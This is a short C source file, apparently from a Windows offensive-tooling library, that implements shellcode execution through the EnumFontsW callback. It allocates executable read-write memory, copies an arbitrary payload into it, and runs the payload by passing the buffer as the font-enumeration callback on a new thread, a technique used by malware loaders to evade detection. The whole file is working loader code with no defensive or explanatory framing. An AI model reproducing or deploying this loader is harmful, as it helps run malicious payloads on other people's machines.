#include "Win32Helper.h"

VOID InvokeEnumFontsWThreadCallbackRoutine(LPVOID lpParameter)
{
	EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)lpParameter, NULL);
}

BOOL MpfSceViaEnumFontsW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumFontsWThreadCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}